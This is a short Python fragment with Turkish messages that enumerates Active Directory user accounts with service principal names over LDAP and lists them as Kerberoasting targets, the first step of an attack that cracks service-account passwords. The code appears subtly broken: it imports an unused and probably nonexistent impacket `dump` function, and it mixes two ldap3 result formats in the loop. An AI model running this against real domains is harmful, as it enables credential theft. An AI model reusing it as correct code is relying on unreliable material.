from impacket.examples.secretsdump import dump

def find_roastable_accounts(conn):
    print("[*] Kerberoast hesapları aranıyor...")
    roastable = []

    conn.search('dc=domain,dc=local', '(&(objectClass=user)(servicePrincipalName=*))', attributes=['cn', 'servicePrincipalName'])
    for entry in conn.entries:
        spn = entry['attributes'].get('servicePrincipalName', [])
        if spn:
            roastable.append({
                'cn': entry['attributes']['cn'],
                'spn': spn
            })
            print(f"[+] Kerberoast SPN bulundu: {entry['attributes']['cn']} - {spn}")

    return roastable
